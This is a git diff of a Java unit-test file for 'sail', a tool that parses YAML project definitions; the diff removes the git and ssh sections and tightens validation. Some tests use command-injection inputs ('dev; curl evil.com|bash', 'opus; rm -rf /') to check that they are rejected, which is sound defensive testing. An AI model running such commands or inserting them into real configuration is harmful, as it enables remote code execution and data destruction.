@@ -39,11 +39,6 @@ class ProjectDefinitionTest {
           node: 22
           maven: "3.9.9"
 
-        git:
-          name: "Acme Engineering"
-          email: "eng@acme.com"
-          auth: token
-
         repos:
           - url: "https://github.com/acme/backend.git"
             path: "acme-backend"
@@ -81,11 +76,6 @@ class ProjectDefinitionTest {
           auto_snapshot: true
           config:
             permissions: full
-
-        ssh:
-          user: dev
-          authorized_keys:
-            - "ssh-ed25519 AAAA... alice@laptop"
         """;
 
   @Test
@@ -106,10 +96,6 @@ class ProjectDefinitionTest {
     assertEquals(25, config.runtimes().jdk());
     assertEquals("22", config.runtimes().node());
     assertEquals("3.9.9", config.runtimes().maven());
-
-    assertEquals("Acme Engineering", config.git().name());
-    assertEquals("eng@acme.com", config.git().email());
-    assertEquals("token", config.git().auth());
 
     assertEquals(2, config.repos().size());
     assertEquals("acme-backend", config.repos().getFirst().path());
@@ -132,9 +118,6 @@ class ProjectDefinitionTest {
     assertEquals("sail/", config.agent().branchPrefix());
     assertTrue(config.agent().autoSnapshot());
     assertEquals("full", config.agent().config().get("permissions"));
-
-    assertEquals("dev", config.ssh().user());
-    assertEquals(1, config.ssh().authorizedKeys().size());
   }
 
   @Test
@@ -156,16 +139,39 @@ class ProjectDefinitionTest {
   }
 
   @Test
-  void repoFromMapAcceptsHttpsAndScpUrls() {
+  void aRepoIsClonedOverHttpsAndAnSshUrlIsRefusedNamingItsHttpsForm() {
     var https =
         ProjectDefinition.Repo.fromMap(
-            java.util.Map.of("url", "https://github.com/acme/backend.git", "path", "backend"));
+            Map.of("url", "https://github.com/acme/backend.git", "path", "backend"));
     assertEquals("https://github.com/acme/backend.git", https.url());
 
-    var scp =
-        ProjectDefinition.Repo.fromMap(
-            java.util.Map.of("url", "git@github.com:acme/backend.git", "path", "backend"));
-    assertEquals("git@github.com:acme/backend.git", scp.url());
+    assertEquals(
+        "repos[].url 'git@github.com:acme/backend.git' is not an https URL: sail clones over https"
+            + " with the box's forge token. Use https://github.com/acme/backend.git.",
+        assertThrows(
+                IllegalArgumentException.class,
+                () ->
+                    ProjectDefinition.Repo.fromMap(
+                        Map.of("url", "git@github.com:acme/backend.git", "path", "backend")))
+            .getMessage());
+    assertEquals(
+        "repos[].url 'ssh://git@git.acme.dev:2222/org/api.git' is not an https URL: sail clones"
+            + " over https with the box's forge token. Use https://git.acme.dev/org/api.git.",
+        assertThrows(
+                IllegalArgumentException.class,
+                () ->
+                    ProjectDefinition.Repo.fromMap(
+                        Map.of("url", "ssh://git@git.acme.dev:2222/org/api.git", "path", "api")))
+            .getMessage());
+    assertEquals(
+        "repos[].url 'git://example.com/x.git' is not an https URL: sail clones over https with"
+            + " the box's forge token. Use the repository's https URL.",
+        assertThrows(
+                IllegalArgumentException.class,
+                () ->
+                    ProjectDefinition.Repo.fromMap(
+                        Map.of("url", "git://example.com/x.git", "path", "x")))
+            .getMessage());
   }
 
   @Test
@@ -209,92 +215,6 @@ class ProjectDefinitionTest {
     var runtimes =
         ProjectDefinition.Runtimes.fromMap(java.util.Map.of("jdk", 25, "maven", "3.9.9"));
     assertEquals("3.9.9", runtimes.maven());
-  }
-
-  @Test
-  void gitFromMapDefaultsAuthToToken() {
-    var git =
-        ProjectDefinition.Git.fromMap(java.util.Map.of("name", "Test", "email", "test@test.com"));
-    assertEquals("token", git.auth());
-  }
-
-  @Test
-  void gitFromMapAcceptsSshAuth() {
-    var git =
-        ProjectDefinition.Git.fromMap(
-            java.util.Map.of("name", "Test", "email", "test@test.com", "auth", "ssh"));
-    assertEquals("ssh", git.auth());
-  }
-
-  @Test
-  void gitFromMapThrowsOnMissingName() {
-    var ex =
-        assertThrows(
-            IllegalArgumentException.class,
-            () -> ProjectDefinition.Git.fromMap(java.util.Map.of("email", "test@test.com")));
-    assertTrue(ex.getMessage().contains("git.name"));
-  }
-
-  @Test
-  void gitFromMapThrowsOnMissingEmail() {
-    var ex =
-        assertThrows(
-            IllegalArgumentException.class,
-            () -> ProjectDefinition.Git.fromMap(java.util.Map.of("name", "Test")));
-    assertTrue(ex.getMessage().contains("git.email"));
-  }
-
-  @Test
-  void gitFromMapThrowsOnInvalidAuth() {
-    var ex =
-        assertThrows(
-            IllegalArgumentException.class,
-            () ->
-                ProjectDefinition.Git.fromMap(
-                    java.util.Map.of("name", "Test", "email", "test@test.com", "auth", "bad")));
-    assertTrue(ex.getMessage().contains("git.auth"));
-  }
-
-  @Test
-  void gitFromMapParsesSshKey() {
-    var map = new java.util.HashMap<String, Object>();
-    map.put("name", "Test");
-    map.put("email", "test@test.com");
-    map.put("auth", "ssh");
-    map.put("ssh_key", "~/.ssh/id_ed25519");
-    var git = ProjectDefinition.Git.fromMap(map);
-    assertEquals("ssh", git.auth());
-    assertEquals("~/.ssh/id_ed25519", git.sshKey());
-  }
-
-  @Test
-  void gitFromMapSshKeyNullWhenAbsent() {
-    var git =
-        ProjectDefinition.Git.fromMap(
-            java.util.Map.of("name", "Test", "email", "test@test.com", "auth", "ssh"));
-    assertNull(git.sshKey());
-  }
-
-  @Test
-  void gitToMapIncludesSshKeyWhenSet() {
-    var git = new ProjectDefinition.Git("Test", "test@test.com", "ssh", "~/.ssh/id_ed25519");
-    var map = git.toMap();
-    assertEquals("~/.ssh/id_ed25519", map.get("ssh_key"));
-  }
-
-  @Test
-  void gitToMapOmitsSshKeyWhenNull() {
-    var git = new ProjectDefinition.Git("Test", "test@test.com", "token", null);
-    var map = git.toMap();
-    assertFalse(map.containsKey("ssh_key"));
-  }
-
-  @Test
-  void gitSshKeyRoundTripsViaToMapFromMap() {
-    var original = new ProjectDefinition.Git("Dev", "dev@test.com", "ssh", "~/.ssh/id_ed25519");
-    var roundTripped = ProjectDefinition.Git.fromMap(original.toMap());
-    assertEquals("ssh", roundTripped.auth());
-    assertEquals("~/.ssh/id_ed25519", roundTripped.sshKey());
   }
 
   @Test
@@ -347,16 +267,6 @@ class ProjectDefinitionTest {
   }
 
   @Test
-  void sshFromMapRejectsInvalidUser() {
-    var ex =
-        assertThrows(
-            IllegalArgumentException.class,
-            () ->
-                ProjectDefinition.Ssh.fromMap(java.util.Map.of("user", "dev; curl evil.com|bash")));
-    assertTrue(ex.getMessage().contains("Invalid ssh.user"));
-  }
-
-  @Test
   void runtimesFromMapRejectsInvalidMavenVersion() {
     var ex =
         assertThrows(
@@ -387,7 +297,7 @@ class ProjectDefinitionTest {
     var serviceMap =
         java.util.Map.<String, Object>of("image", "meilisearch:latest", "environment", envMap);
 
-    var service = ProjectDefinition.Service.fromMap(serviceMap);
+    var service = ProjectDefinition.Service.fromMap("meilisearch", serviceMap);
 
     assertEquals("development", service.environment().get("MEILI_ENV"));
     assertEquals("true", service.environment().get("MEILI_NO_ANALYTICS"));
@@ -414,20 +324,6 @@ class ProjectDefinitionTest {
   }
 
   @Test
-  void sshUserReturnsSshUserWhenConfigured() throws Exception {
-    var config = ProjectDefinition.fromMap(YamlUtil.parseMap(EXAMPLE_YAML));
-
-    assertEquals("dev", config.sshUser());
-  }
-
-  @Test
-  void sshUserDefaultsToDevWhenNoSshBlock() throws Exception {
-    var config = ProjectDefinition.fromMap(YamlUtil.parseMap("name: test"));
-
-    assertEquals("dev", config.sshUser());
-  }
-
-  @Test
   void repoPathsReturnsAbsolutePathsForEachRepo() throws Exception {
     var config = ProjectDefinition.fromMap(YamlUtil.parseMap(EXAMPLE_YAML));
 
@@ -446,62 +342,6 @@ class ProjectDefinitionTest {
 
     assertEquals(1, paths.size());
     assertEquals("/home/dev/workspace", paths.getFirst());
-  }
-
-  @Test
-  void repoPathsUsesSshUser() throws Exception {
-    var yaml =
-        """
-        name: test
-        ssh:
-          user: alice
-        repos:
-          - url: "https://github.com/test/app.git"
-            path: "app"
-        """;
-    var config = ProjectDefinition.fromMap(YamlUtil.parseMap(yaml));
-
-    assertEquals("/home/alice/workspace/app", config.repoPaths().getFirst());
-  }
-
-  @Test
-  void retiredGuardrailKeyNamesTheProjectAndExactEdit() {
-    var yaml =
-        """
-        name: test
-        agent:
-          type: claude-code
-          guardrails:
-            idle_timeout: 90m
-        """;
-    var refusal =
-        assertThrows(
-            IllegalArgumentException.class,
-            () -> ProjectDefinition.fromMap(YamlUtil.parseMap(yaml)));
-
-    assertEquals(
-        "Unknown guardrail key `idle_timeout` in test/sail.yaml; rename `idle_timeout` to"
-            + " `max_idle` in test/sail.yaml.",
-        refusal.getMessage());
-  }
-
-  @Test
-  void specsDirIsRejectedWithAnExactEdit() {
-    var yaml =
-        """
-        name: test
-        agent:
-          type: claude-code
-          specs_dir: specs
-        """;
-    var ex =
-        assertThrows(
-            IllegalArgumentException.class,
-            () -> ProjectDefinition.fromMap(YamlUtil.parseMap(yaml)));
-    assertEquals(
-        "Unknown agent key `specs_dir` in test/sail.yaml; remove `specs_dir` from test/sail.yaml"
-            + " because specs live in the Sail database.",
-        ex.getMessage());
   }
 
   @Test
@@ -562,7 +402,6 @@ class ProjectDefinitionTest {
 
     assertEquals("simple-project", config.name());
     assertNull(config.resources());
-    assertNull(config.git());
     assertNull(config.repos());
     assertNull(config.services());
     assertNull(config.agent());
@@ -584,10 +423,6 @@ class ProjectDefinitionTest {
     assertEquals(original.runtimes().jdk(), roundTripped.runtimes().jdk());
     assertEquals(original.runtimes().node(), roundTripped.runtimes().node());
     assertEquals(original.runtimes().maven(), roundTripped.runtimes().maven());
-    assertEquals(original.git().name(), roundTripped.git().name());
-    assertEquals(original.git().email(), roundTripped.git().email());
-    assertEquals(original.git().auth(), roundTripped.git().auth());
-    assertEquals(original.git().sshKey(), roundTripped.git().sshKey());
     assertEquals(original.repos().size(), roundTripped.repos().size());
     assertEquals(original.repos().getFirst().url(), roundTripped.repos().getFirst().url());
     assertEquals(original.repos().getFirst().branch(), roundTripped.repos().getFirst().branch());
@@ -599,8 +434,7 @@ class ProjectDefinitionTest {
     assertEquals(original.agent().type(), roundTripped.agent().type());
     assertEquals(original.agent().autoBranch(), roundTripped.agent().autoBranch());
     assertEquals(original.agent().autoSnapshot(), roundTripped.agent().autoSnapshot());
-    assertEquals(original.ssh().user(), roundTripped.ssh().user());
-    assertEquals(original.ssh().authorizedKeys(), roundTripped.ssh().authorizedKeys());
+    assertEquals(original, roundTripped, "every section round-trips");
   }
 
   @Test
@@ -611,11 +445,10 @@ class ProjectDefinitionTest {
     assertEquals("test", map.get("name"));
     assertFalse(map.containsKey("resources"));
     assertFalse(map.containsKey("runtimes"));
-    assertFalse(map.containsKey("git"));
     assertFalse(map.containsKey("repos"));
     assertFalse(map.containsKey("services"));
     assertFalse(map.containsKey("agent"));
-    assertFalse(map.containsKey("ssh"));
+    assertFalse(map.containsKey("pipeline"));
   }
 
   @Test
@@ -713,16 +546,11 @@ class ProjectDefinitionTest {
 
   @Test
   void eachLaneReadsItsOwnGuardrailsAndItsOwnDefaults() {
-    var bare = ProjectDefinition.Agent.fromMap(Map.of("type", "claude-code"));
+    var bare = definition(Map.of("type", "claude-code"), null);
     var configured =
-        ProjectDefinition.Agent.fromMap(
-            Map.of(
-                "type",
-                "claude-code",
-                "guardrails",
-                Map.of("max_duration", "6h"),
-                "review_pipeline",
-                Map.of("guardrails", Map.of("max_duration", "90m", "max_idle", "30m"))));
+        definition(
+            Map.of("type", "claude-code", "guardrails", Map.of("max_duration", "6h")),
+            Map.of("guardrails", Map.of("max_duration", "90m", "max_idle", "30m")));
 
     for (var lane : Lane.values()) {
       var review = lane == Lane.REVIEW;
@@ -738,27 +566,29 @@ class ProjectDefinitionTest {
     assertEquals(Guardrails.defaults(), bare.guardrailsFor(null), "an unknown lane is a build's");
   }
 
+  /** A definition named acme with {@code agent} and {@code pipeline} as its sections. */
+  private static ProjectDefinition definition(
+      Map<String, Object> agent, Map<String, Object> pipeline) {
+    var map = new java.util.LinkedHashMap<String, Object>();
+    map.put("name", "acme");
+    map.put("agent", agent);
+    if (pipeline != null) {
+      map.put("pipeline", pipeline);
+    }
+    return ProjectDefinition.fromMap(map);
+  }
+
   @Test
   void aRunsLifetimeIsItsLanesLimitAndABuildNothingBoundsHasNone() {
-    var bare = ProjectDefinition.Agent.fromMap(Map.of("type", "claude-code"));
+    var bare = definition(Map.of("type", "claude-code"), null);
     var configured =
-        ProjectDefinition.Agent.fromMap(
-            Map.of(
-                "type",
-                "claude-code",
-                "guardrails",
-                Map.of("max_duration", "6h"),
-                "review_pipeline",
-                Map.of("guardrails", Map.of("max_duration", "90m"))));
+        definition(
+            Map.of("type", "claude-code", "guardrails", Map.of("max_duration", "6h")),
+            Map.of("guardrails", Map.of("max_duration", "90m")));
     var unlimited =
-        ProjectDefinition.Agent.fromMap(
-            Map.of(
-                "type",
-                "claude-code",
-                "guardrails",
-                Map.of("max_idle", "30m"),
-                "review_pipeline",
-                Map.of("guardrails", Map.of("max_idle", "30m"))));
+        definition(
+            Map.of("type", "claude-code", "guardrails", Map.of("max_idle", "30m")),
+            Map.of("guardrails", Map.of("max_idle", "30m")));
 
     for (var lane : Lane.values()) {
       var review = lane == Lane.REVIEW;
@@ -774,26 +604,28 @@ class ProjectDefinitionTest {
   }
 
   @Test
-  void anInvalidReviewLaneGuardrailFailsTheDescriptorWhereItIsValidated() {
+  void anInvalidReviewLaneGuardrailIsRefusedNamingTheField() {
     var refused =
         assertThrows(
             IllegalArgumentException.class,
             () ->
-                ProjectDefinition.Agent.fromMap(
-                    Map.of(
-                        "type",
-                        "claude-code",
-                        "review_pipeline",
-                        Map.of("guardrails", Map.of("max_duration", "1 hour"))),
-                    "acme/sail.yaml"));
+                definition(
+                    Map.of("type", "claude-code"),
+                    Map.of("guardrails", Map.of("max_duration", "1 hour"))));
 
     assertTrue(
-        refused
-            .getMessage()
-            .startsWith(
-                "Invalid `agent.review_pipeline.guardrails.max_duration` in acme/sail.yaml: "),
+        refused.getMessage().startsWith("Invalid `pipeline.guardrails.max_duration`: "),
         refused.getMessage());
     assertTrue(refused.getMessage().contains("4h, 90m, 30s"), refused.getMessage());
+    assertEquals(
+        "Invalid `agent.guardrails.max_duration`: write it as text such as 45m, 4h or 90s.",
+        assertThrows(
+                IllegalArgumentException.class,
+                () ->
+                    definition(
+                        Map.of("type", "claude-code", "guardrails", Map.of("max_duration", 90)),
+                        null))
+            .getMessage());
   }
 
   @Test
@@ -801,17 +633,11 @@ class ProjectDefinitionTest {
     var refused =
         assertThrows(
             IllegalArgumentException.class,
-            () ->
-                ProjectDefinition.Agent.fromMap(
-                    Map.of("type", "claude-code", "review_pipeline", Map.of("guardrails", "90m")),
-                    "acme/sail.yaml"));
+            () -> definition(Map.of("type", "claude-code"), Map.of("guardrails", "90m")));
 
     assertTrue(
-        refused
-            .getMessage()
-            .startsWith("Invalid `agent.review_pipeline.guardrails` in acme/sail.yaml: "),
-        refused.getMessage());
-    assertTrue(refused.getMessage().contains("max_duration: 45m"), refused.getMessage());
+        refused.getMessage().startsWith("Invalid `pipeline.guardrails`: "), refused.getMessage());
+    assertTrue(refused.getMessage().contains("\"max_duration\": \"45m\""), refused.getMessage());
   }
 
   @Test
@@ -819,141 +645,95 @@ class ProjectDefinitionTest {
     var refused =
         assertThrows(
             IllegalArgumentException.class,
-            () ->
-                ProjectDefinition.Agent.fromMap(
-                    Map.of("type", "claude-code", "guardrails", "4h"), "acme/sail.yaml"));
+            () -> definition(Map.of("type", "claude-code", "guardrails", "4h"), null));
 
     assertTrue(
-        refused.getMessage().startsWith("Invalid `agent.guardrails` in acme/sail.yaml: "),
-        refused.getMessage());
+        refused.getMessage().startsWith("Invalid `agent.guardrails`: "), refused.getMessage());
   }
 
   @Test
-  void anActionSailDoesNotKnowIsRefusedNamingItsBlockItsFileAndTheOnesItDoes() {
+  void anActionSailDoesNotKnowIsRefusedNamingItsBlockAndTheOnesItDoes() {
     var refused =
         assertThrows(
             IllegalArgumentException.class,
             () ->
-                ProjectDefinition.Agent.fromMap(
-                    Map.of(
-                        "type",
-                        "claude-code",
-                        "review_pipeline",
-                        Map.of("guardrails", Map.of("action", "halt"))),
-                    "acme/sail.yaml"));
+                definition(
+                    Map.of("type", "claude-code"), Map.of("guardrails", Map.of("action", "halt"))));
 
     assertTrue(
-        refused
-            .getMessage()
-            .startsWith("Invalid `agent.review_pipeline.guardrails.action` in acme/sail.yaml: "),
+        refused.getMessage().startsWith("Invalid `pipeline.guardrails.action`: "),
         refused.getMessage());
     assertTrue(
         refused.getMessage().contains("stop, snapshot-and-stop, notify"), refused.getMessage());
   }
 
   @Test
-  void theReviewPipelineSurvivesAnAgentRoundTripAndAnInstallListChange() {
-    var agent =
-        ProjectDefinition.Agent.fromMap(
+  void theReviewPipelineIsASectionOfItsOwnThatSurvivesARoundTripAndAnInstallListChange() {
+    var config =
+        definition(
+            Map.of("type", "claude-code"),
             Map.of(
-                "type",
-                "claude-code",
-                "review_pipeline",
-                Map.of(
-                    "guardrails",
-                    Map.of("max_duration", "90m"),
-                    "stages",
-                    List.of(
-                        Map.of(
-                            "name",
-                            "security",
-                            "agent",
-                            "codex",
-                            "brief",
-                            "Judge the security surface.",
-                            "gate",
-                            "no_critical_or_high"),
-                        Map.of("name", "sign-off", "type", "human")))));
+                "guardrails",
+                Map.of("max_duration", "90m"),
+                "stages",
+                List.of(
+                    Map.of(
+                        "name",
+                        "security",
+                        "agent",
+                        "codex",
+                        "brief",
+                        "Judge the security surface.",
+                        "gate",
+                        "no_critical_or_high"),
+                    Map.of("name", "sign-off", "type", "human"))));
 
     @SuppressWarnings("unchecked")
-    var pipeline = (Map<String, Object>) agent.toMap().get("review_pipeline");
-    var reparsed = ProjectDefinition.fromMap(Map.of("name", "acme", "agent", agent.toMap()));
+    var pipeline = (Map<String, Object>) config.toMap().get("pipeline");
+    var reparsed = ProjectDefinition.fromMap(config.toMap());
     var reinstalled = reparsed.withAgentInstall(List.of("claude-code", "codex"));
 
     assertEquals(Map.of("max_duration", "90m", "action", "stop"), pipeline.get("guardrails"));
+    assertFalse(config.agent().toMap().containsKey("review_pipeline"));
     assertEquals(
-        agent.reviewPipeline(),
-        reparsed.agent().reviewPipeline(),
-        "the block a pipeline writes parses back to the same pipeline, stages included");
+        config.pipeline(),
+        reparsed.pipeline(),
+        "the section a pipeline writes parses back to the same pipeline, stages included");
     assertEquals(
-        agent.reviewPipeline(),
-        reinstalled.agent().reviewPipeline(),
+        config.pipeline(),
+        reinstalled.pipeline(),
         "changing the install list keeps the pipeline, its stages and its limits");
   }
 
   @Test
-  void aDeletedKeyIsRefusedInOneSentenceNamingWhereItsTextGoes() {
-    var agent = "name: acme\nagent:\n  type: claude-code\n";
-
-    assertEquals(
-        "agent_context is no longer read: sail writes no context file. Put what it said in the"
-            + " repo's AGENTS.md, and a rule in a project skill (sail project skills add). Then"
-            + " remove `agent_context` from acme/sail.yaml.",
-        refusal(agent + "agent_context:\n  tech_stack: Java\n"));
-    assertEquals(
-        "agent.methodology is no longer read: sail's work prompt tells the agent to run the"
-            + " project's verification. Put the commands in the repo's AGENTS.md. Then remove"
-            + " `agent.methodology` from acme/sail.yaml.",
-        refusal(agent + "  methodology:\n    verify: mvn verify\n"));
-    assertEquals(
-        "agent.build_skill is no longer read: sail's work prompt says how a build runs. Put what"
-            + " the skill said in the repo's AGENTS.md, or keep it as a project skill (sail"
-            + " project skills add) the agent invokes when relevant. Then remove `agent.build_skill` from"
-            + " acme/sail.yaml.",
-        refusal(agent + "  build_skill: acme-build\n"));
-    assertEquals(
-        "agent.review_pipeline.fix_skill is no longer read: a fix run reads the build's work"
-            + " prompt. Put what the skill said in the repo's AGENTS.md, or keep it as a project"
-            + " skill (sail project skills add). Then remove `agent.review_pipeline.fix_skill`"
-            + " from acme/sail.yaml.",
-        refusal(agent + "  review_pipeline:\n    fix_skill: acme-fix\n"));
-    assertEquals(
-        "agent.review_pipeline.stages[security].skill is no longer read: a stage judges under its"
-            + " brief. Put what the skill said in the stage's brief"
-            + " (agent.review_pipeline.stages[security].brief), or keep it as a project skill"
-            + " (sail project skills add) the brief tells the stage to run.",
-        refusal(
-            agent + "  review_pipeline:\n    stages:\n      - name: security\n        skill: x\n"));
-    assertEquals(
-        "agent.review_pipeline.stages[security].categories is no longer read: what a stage"
-            + " focuses on is its brief. Say it in agent.review_pipeline.stages[security].brief.",
-        refusal(
-            agent
-                + "  review_pipeline:\n    stages:\n      - name: security\n        categories: [a]\n"));
-  }
-
-  @Test
   void aBriefIsTextOnAnAgentStageWithinThePromptBudget() {
-    var agent = "name: acme\nagent:\n  type: claude-code\n  review_pipeline:\n    stages:\n";
+    var agent = "name: acme\nagent:\n  type: claude-code\npipeline:\n  stages:\n";
 
     assertEquals(
-        "agent.review_pipeline.stages[sign-off].brief is set on a human stage; a person follows no"
+        "pipeline.stages[sign-off].brief is set on a human stage; a person follows no"
             + " brief, so remove it.",
-        refusal(agent + "      - name: sign-off\n        type: human\n        brief: Look.\n"));
+        refusal(agent + "    - name: sign-off\n      type: human\n      brief: Look.\n"));
     assertEquals(
-        "agent.review_pipeline.stages[review].brief is 32001 code points; the limit is 32000.",
-        refusal(agent + "      - name: review\n        brief: " + "x".repeat(32_001) + "\n"));
+        "pipeline.stages[review].brief is 32001 code points; the limit is 32000.",
+        refusal(agent + "    - name: review\n      brief: " + "x".repeat(32_001) + "\n"));
     assertEquals(
-        "agent.review_pipeline.stages[review].brief is blank; write it or remove it.",
-        refusal(agent + "      - name: review\n        brief: '  '\n"));
+        "pipeline.stages[review].brief is blank; write it or remove it.",
+        refusal(agent + "    - name: review\n      brief: '  '\n"));
     assertEquals(
-        "agent.review_pipeline.stages[review].brief must be text.",
-        refusal(agent + "      - name: review\n        brief: [a]\n"));
+        "pipeline.stages[review].brief must be text.",
+        refusal(agent + "    - name: review\n      brief: [a]\n"));
+    assertEquals(
+        "pipeline.stages[review].gate is 'never'; it is one of no_critical, no_critical_or_high,"
+            + " all_clear.",
+        refusal(agent + "    - name: review\n      gate: never\n"));
+    assertEquals(
+        "pipeline.stages[].skill is not a key of pipeline.stages[]. Its keys are: name, type,"
+            + " agent, gate, brief.",
+        refusal(agent + "    - name: review\n      skill: x\n"));
     var stage =
         ProjectDefinition.fromMap(
-                YamlUtil.parseMap(agent + "      - name: review\n        brief: Judge.\n"))
-            .agent()
-            .reviewPipeline()
+                YamlUtil.parseMap(agent + "    - name: review\n      brief: Judge.\n"))
+            .pipeline()
             .stages()
             .getFirst();
     assertEquals("Judge.", stage.brief());
@@ -985,8 +765,7 @@ class ProjectDefinitionTest {
         "repos[].forge must be 'github' when set, got: gitlab",
         refusal(yaml.replace("forge: github", "forge: gitlab")));
     assertEquals(
-        "repos[].forge must be text when set.",
-        refusal(yaml.replace("forge: github", "forge: [a]")));
+        "repos[].forge must be text.", refusal(yaml.replace("forge: github", "forge: [a]")));
   }
 
   @Test
@@ -1020,7 +799,7 @@ class ProjectDefinitionTest {
     var yaml = "name: acme\nagent:\n  type: claude-code\n  member:\n    agent: codex\n";
 
     assertEquals(
-        "agent.member.agent 'codex' is not a harness acme/sail.yaml installs (claude-code). Add"
+        "agent.member.agent 'codex' is not a harness the project installs (claude-code). Add"
             + " it to agent.install, or name one of those.",
         refusal(yaml));
   }
@@ -1030,7 +809,7 @@ class ProjectDefinitionTest {
     var yaml = "name: acme\nagent:\n  type: claude-code\n  install: [codex]\n";
 
     assertEquals(
-        "agent.member.agent 'claude-code' is not a harness acme/sail.yaml installs (codex). Add"
+        "agent.member.agent 'claude-code' is not a harness the project installs (codex). Add"
             + " it to agent.install, or name one of those.",
         refusal(yaml));
   }
@@ -1048,8 +827,7 @@ class ProjectDefinitionTest {
     var yaml = "name: acme\nagent:\n  member:\n    model: gpt-5-codex\n";
 
     assertEquals(
-        "agent.member.agent in acme/sail.yaml is unset and agent.type names no agent. Set one of"
-            + " them.",
+        "agent.member.agent is unset and agent.type names no agent. Set one of them.",
         refusal(yaml));
   }
 
@@ -1058,12 +836,11 @@ class ProjectDefinitionTest {
     var base = "name: acme\nagent:\n  type: claude-code\n  member:\n";
 
     assertEquals(
-        "agent.member.mode in acme/sail.yaml: Engagement mode must be 'full' or 'read_only', got"
-            + " 'admin'.",
+        "agent.member.mode: Engagement mode must be 'full' or 'read_only', got 'admin'.",
         refusal(base + "    mode: admin\n"));
     assertEquals(
-        "agent.member.model 'opus; rm -rf /' in acme/sail.yaml is not a model id. Use one without"
-            + " spaces or shell syntax.",
+        "agent.member.model 'opus; rm -rf /' is not a model id. Use one without spaces or shell"
+            + " syntax.",
         refusal(base + "    model: 'opus; rm -rf /'\n"));
   }
 
@@ -1197,5 +974,78 @@ class ProjectDefinitionTest {
     assertEquals(
         "Invalid process name: 'my app'. Must match [a-zA-Z0-9][a-zA-Z0-9._-]*, max 63 characters.",
         processRefusal("  my app:\n    command: x\n"));
+  }
+
+  @Test
+  void aDefinitionHoldsItsNameAndItsSectionsAndNothingElse() {
+    assertEquals(
+        "git is not a key of a project definition. Its keys are: name, description, image,"
+            + " resources, runtimes, repos, services, processes, packages, agent, pipeline.",
+        refusal("name: acme\ngit:\n  name: Ada\n"));
+    assertEquals(
+        "ssh is not a key of a project definition. Its keys are: name, description, image,"
+            + " resources, runtimes, repos, services, processes, packages, agent, pipeline.",
+        refusal("name: acme\nssh:\n  user: dev\n"));
+    assertEquals(
+        "agent.review_pipeline is not a key of agent. Its keys are: type, auto_branch,"
+            + " branch_prefix, auto_snapshot, install, config, guardrails, notifications, member.",
+        refusal("name: acme\nagent:\n  type: claude-code\n  review_pipeline: {}\n"));
+    assertEquals(
+        "resources.cpus is not a key of resources. Its keys are: cpu, memory, disk.",
+        refusal("name: acme\nresources:\n  cpus: 4\n"));
+    assertEquals("name is required: the project's name.", refusal("description: x\n"));
+  }
+
+  @Test
+  void aValueOfTheWrongTypeIsRefusedNamingItsField() {
+    assertEquals("resources.cpu must be a whole number.", refusal(resources("'4'", "8GB")));
+    assertEquals(
+        "resources.cpu is required: a whole number of cores, 1 or more.",
+        refusal(resources("0", "8GB")));
+    assertEquals(
+        "resources.memory is required: a size such as \"8GB\".", refusal(resources("4", "[a]")));
+    assertEquals("description must be text.", refusal("name: acme\ndescription: [a]\n"));
+    assertEquals("packages[1] must be text.", refusal("name: acme\npackages: [git, 3]\n"));
+    assertEquals(
+        "agent.auto_branch must be true or false.",
+        refusal("name: acme\nagent:\n  auto_branch: yes please\n"));
+    assertEquals("services must be a block of keys.", refusal("name: acme\nservices: [a]\n"));
+    assertEquals("repos[0] must be a block of keys.", refusal("name: acme\nrepos: [a]\n"));
+    assertEquals(
+        "services.db.ports[0] must be a whole number.",
+        refusal("name: acme\nservices:\n  db:\n    image: postgres:16\n    ports: [x]\n"));
+    assertEquals(
+        "services.db.image is required: the image it runs.",
+        refusal("name: acme\nservices:\n  db:\n    ports: [5432]\n"));
+    assertEquals(
+        "runtimes.node must be a version such as 24.",
+        refusal("name: acme\nruntimes:\n  node: [24]\n"));
+    assertEquals(
+        "pipeline.max_iterations must be 1 or more.",
+        refusal("name: acme\npipeline:\n  max_iterations: 0\n"));
+  }
+
+  private static String resources(String cpu, String memory) {
+    return "name: acme\nresources:\n  cpu: " + cpu + "\n  memory: " + memory + "\n  disk: 50GB\n";
+  }
+
+  @Test
+  void aSectionIsNamedByItsKeyAndAnyOtherNameIsRefusedListingThem() {
+    for (var section : ProjectDefinition.Section.values()) {
+      assertEquals(section, ProjectDefinition.Section.of(section.key()));
+    }
+    assertEquals(
+        "'git' is not a section of a project definition. The sections are: description, image,"
+            + " resources, runtimes, repos, services, processes, packages, agent, pipeline.",
+        assertThrows(IllegalArgumentException.class, () -> ProjectDefinition.Section.of("git"))
+            .getMessage());
+  }
+
+  @Test
+  void everyAgentShellAndHookRunsAsDev() {
+    assertEquals("dev", ProjectDefinition.USER);
+    assertEquals(
+        List.of("/home/dev/workspace/acme-backend", "/home/dev/workspace/acme-webapp"),
+        ProjectDefinition.fromMap(YamlUtil.parseMap(EXAMPLE_YAML)).repoPaths());
   }
 }
